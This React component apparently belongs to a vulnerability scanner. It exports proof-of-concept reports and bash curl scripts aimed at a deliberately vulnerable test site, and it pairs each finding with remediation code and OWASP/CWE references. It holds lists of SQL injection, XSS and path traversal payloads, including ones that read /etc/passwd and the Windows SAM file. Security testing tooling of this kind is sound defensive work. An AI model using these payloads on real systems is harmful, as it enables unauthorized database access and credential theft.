import React, { useState } from 'react';
import '../styles/PocExporter.css';

function PocExporter({ vulnerabilities }) {
  const [showExportModal, setShowExportModal] = useState(false);
  const [exportFormat, setExportFormat] = useState('json');

  const generateJsonReport = () => {
    const report = {
      metadata: {
        exportedAt: new Date().toISOString(),
        totalVulnerabilities: vulnerabilities.length,
        generator: 'ZerOn Security Scanner'
      },
      summary: {
        critical: vulnerabilities.filter(v => v.severity === 'critical').length,
        high: vulnerabilities.filter(v => v.severity === 'high').length,
        medium: vulnerabilities.filter(v => v.severity === 'medium').length,
        low: vulnerabilities.filter(v => v.severity === 'low').length,
        info: vulnerabilities.filter(v => v.severity === 'info').length
      },
      vulnerabilities: vulnerabilities.map((vuln, index) => ({
        id: vuln.id,
        index: index + 1,
        type: vuln.type,
        severity: vuln.severity,
        cvss: vuln.cvss,
        endpoint: vuln.endpoint,
        parameter: vuln.parameter,
        description: vuln.description,
        payload: vuln.payload,
        poc: generatePocForVulnerability(vuln),
        remediation: getRemediationForType(vuln.type),
        references: getReferencesForType(vuln.type)
      }))
    };

    return JSON.stringify(report, null, 2);
  };

  const generatePocForVulnerability = (vuln) => {
    const baseUrl = 'http://testphp.vulnweb.com';

    const pocs = {
      'SQL Injection': {
        description: 'SQL Injection vulnerability in parameter allows unauthorized database access',
        vulnerable_request: {
          method: 'GET',
          url: `${baseUrl}${vuln.endpoint}?${vuln.parameter}=${encodeURIComponent(vuln.payload)}`,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
          },
          curl: `curl -X GET "${baseUrl}${vuln.endpoint}?${vuln.parameter}=${encodeURIComponent(vuln.payload)}" \\\n  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`
        },
        expected_response: {
          status_code: 200,
          indicators: [
            'SQL syntax error',
            'mysql_fetch_array()',
            'MySQL error near',
            'Warning: mysql_',
            'Database error'
          ],
          example: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "'1'='1"` 
        },
        alternative_payloads: [
          `${vuln.parameter}=1' OR '1'='1`,
          `${vuln.parameter}=1' OR 1=1 --`,
          `${vuln.parameter}=1' UNION SELECT NULL,NULL,NULL --`,
          `${vuln.parameter}=1' AND SLEEP(5) --`,
          `${vuln.parameter}=1' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --`
        ]
      },
      'Reflected XSS': {
        description: 'Reflected Cross-Site Scripting allows execution of arbitrary JavaScript',
        vulnerable_request: {
          method: 'GET',
          url: `${baseUrl}${vuln.endpoint}?${vuln.parameter}=${encodeURIComponent(vuln.payload)}`,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
          },
          curl: `curl -X GET "${baseUrl}${vuln.endpoint}?${vuln.parameter}=${encodeURIComponent(vuln.payload)}" \\\n  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`
        },
        expected_response: {
          status_code: 200,
          indicators: [
            'JavaScript code appears unescaped in HTML',
            'Payload is reflected in page source',
            'Script tag executed'
          ],
          example: 'Page source contains: <script>alert("XSS")</script>'
        },
        alternative_payloads: [
          `${vuln.parameter}=<svg onload=alert('XSS')>`,
          `${vuln.parameter}=<img src=x onerror=alert('XSS')>`,
          `${vuln.parameter}=<iframe src="javascript:alert('XSS')"></iframe>`,
          `${vuln.parameter}=<body onload=alert('XSS')>`,
          `${vuln.parameter}="><script>alert('XSS')</script>`
        ]
      },
      'Path Traversal': {
        description: 'Path Traversal vulnerability allows access to files outside intended directory',
        vulnerable_request: {
          method: 'GET',
          url: `${baseUrl}${vuln.endpoint}?${vuln.parameter}=${encodeURIComponent(vuln.payload)}`,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*'
          },
          curl: `curl -X GET "${baseUrl}${vuln.endpoint}?${vuln.parameter}=${encodeURIComponent(vuln.payload)}" \\\n  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\\n  -v`
        },
        expected_response: {
          status_code: 200,
          indicators: [
            'root:x:0:0',
            'Linux system configuration',
            'File contents displayed',
            'Directory listing appears'
          ],
          example: 'Sensitive file contents (e.g., /etc/passwd) are returned'
        },
        alternative_payloads: [
          `${vuln.parameter}=../../../etc/passwd`,
          `${vuln.parameter}=..\\..\\..\\windows\\system32\\config\\sam`,
          `${vuln.parameter}=....//....//....//etc/passwd`,
          `${vuln.parameter}=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
          `${vuln.parameter}=..%252f..%252f..%252fetc%252fpasswd`
        ]
      },
      'Old Framework': {
        description: 'Outdated framework version detected with known vulnerabilities',
        vulnerable_request: {
          method: 'GET',
          url: `${baseUrl}${vuln.endpoint}`,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
          },
          curl: `curl -I "${baseUrl}${vuln.endpoint}" \\\n  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`
        },
        expected_response: {
          status_code: 200,
          indicators: [
            'X-Powered-By header reveals outdated version',
            'Meta generator tag shows old version',
            'Server header contains version info'
          ],
          example: 'X-Powered-By: PHP/5.2.17'
        },
        alternative_payloads: []
      }
    };

    return pocs[vuln.type] || {
      description: 'Generic vulnerability PoC',
      vulnerable_request: {
        method: 'GET',
        url: `${baseUrl}${vuln.endpoint}`,
        headers: {
          'User-Agent': 'Mozilla/5.0'
        },
        curl: `curl -X GET "${baseUrl}${vuln.endpoint}"`
      },
      expected_response: {
        status_code: 200,
        indicators: ['Vulnerability confirmed']
      },
      alternative_payloads: []
    };
  };

  const getRemediationForType = (type) => {
    const remediations = {
      'SQL Injection': {
        immediate: [
          'Use parameterized queries/prepared statements',
          'Implement input validation and sanitization',
          'Apply least privilege principle to database accounts'
        ],
        long_term: [
          'Conduct security code review',
          'Implement WAF rules',
          'Regular security testing',
          'Developer security training'
        ],
        code_example: `
// VULNERABLE
const query = "SELECT * FROM users WHERE id = " + userId;

// SECURE
const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId]);
        `
      },
      'Reflected XSS': {
        immediate: [
          'Encode all user input in output context',
          'Implement Content Security Policy (CSP)',
          'Use templating engines with auto-escaping'
        ],
        long_term: [
          'Input validation on server-side',
          'Output encoding based on context',
          'Security headers configuration',
          'Regular security assessments'
        ],
        code_example: `
// VULNERABLE
res.send("<h1>" + userInput + "</h1>");

// SECURE
const escaped = userInput
  .replace(/&/g, "&amp;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;")
  .replace(/"/g, "&quot;")
  .replace(/'/g, "&#x27;");
res.send("<h1>" + escaped + "</h1>");
        `
      },
      'Path Traversal': {
        immediate: [
          'Validate file paths against whitelist',
          'Reject requests with ".." or similar patterns',
          'Use realpath() to resolve symlinks'
        ],
        long_term: [
          'Implement proper access controls',
          'Run application with least privilege',
          'Regular file system audits',
          'Security testing for path traversal'
        ],
        code_example: `
// VULNERABLE
fs.readFile(userPath, 'utf8', callback);

// SECURE
const path = require('path');
const safePath = path.resolve(baseDir, userPath);
if (!safePath.startsWith(baseDir)) {
  throw new Error('Invalid path');
}
fs.readFile(safePath, 'utf8', callback);
        `
      }
    };

    return remediations[type] || {
      immediate: ['Apply latest security patches'],
      long_term: ['Implement comprehensive security program']
    };
  };

  const getReferencesForType = (type) => {
    const references = {
      'SQL Injection': [
        {
          title: 'OWASP SQL Injection',
          url: 'https://owasp.org/www-community/attacks/SQL_Injection'
        },
        {
          title: 'CWE-89: SQL Injection',
          url: 'https://cwe.mitre.org/data/definitions/89.html'
        }
      ],
      'Reflected XSS': [
        {
          title: 'OWASP Cross-Site Scripting (XSS)',
          url: 'https://owasp.org/www-community/attacks/xss/'
        },
        {
          title: 'CWE-79: Improper Neutralization of Input',
          url: 'https://cwe.mitre.org/data/definitions/79.html'
        }
      ],
      'Path Traversal': [
        {
          title: 'OWASP Path Traversal',
          url: 'https://owasp.org/www-community/attacks/Path_Traversal'
        },
        {
          title: 'CWE-22: Path Traversal',
          url: 'https://cwe.mitre.org/data/definitions/22.html'
        }
      ]
    };

    return references[type] || [];
  };

  const downloadJson = () => {
    const json = generateJsonReport();
    const blob = new Blob([json], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `zeron_vulnerabilities_${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const downloadCurlScript = () => {
    const json = JSON.parse(generateJsonReport());
    let curlScript = '#!/bin/bash\n';
    curlScript += '# ZerOn PoC Testing Script\n';
    curlScript += `# Generated: ${new Date().toISOString()}\n\n`;

    json.vulnerabilities.forEach((vuln, index) => {
      curlScript += `\n# ============================================\n`;
      curlScript += `# Vulnerability #${index + 1}: ${vuln.type}\n`;
      curlScript += `# Severity: ${vuln.severity.toUpperCase()} (CVSS: ${vuln.cvss})\n`;
      curlScript += `# ============================================\n`;
      curlScript += `echo "Testing: ${vuln.type}"\n`;
      curlScript += `echo "Endpoint: ${vuln.endpoint}"\n`;
      curlScript += `echo "Parameter: ${vuln.parameter}"\n\n`;

      curlScript += `# Main PoC\n`;
      curlScript += `${vuln.poc.vulnerable_request.curl}\n\n`;

      if (vuln.poc.alternative_payloads.length > 0) {
        curlScript += `# Alternative Payloads\n`;
        vuln.poc.alternative_payloads.forEach((payload, idx) => {
          curlScript += `# Payload ${idx + 1}: ${payload}\n`;
        });
      }
    });

    const blob = new Blob([curlScript], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `zeron_poc_tests_${new Date().toISOString().split('T')[0]}.sh`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    alert('Copied to clipboard!');
  };

  return (
    <div className="poc-exporter">
      <button 
        className="export-poc-btn"
        onClick={() => setShowExportModal(!showExportModal)}
      >
        📦 Export PoC
      </button>

      {showExportModal && (
        <div className="export-modal">
          <div className="modal-content">
            <h3>Export Proof of Concepts</h3>
            
            <div className="export-options">
              <button className="export-option-btn json" onClick={downloadJson}>
                📄 Download JSON Report
              </button>
              <button className="export-option-btn curl" onClick={downloadCurlScript}>
                🐚 Download Curl Script
              </button>
              <button 
                className="export-option-btn clipboard"
                onClick={() => copyToClipboard(generateJsonReport())}
              >
                📋 Copy JSON to Clipboard
              </button>
            </div>

            <div className="poc-preview">
              <h4>JSON Format Preview:</h4>
              <pre>{JSON.stringify(JSON.parse(generateJsonReport()), null, 2).substring(0, 500)}...</pre>
            </div>

            <button 
              className="close-btn"
              onClick={() => setShowExportModal(false)}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default PocExporter;
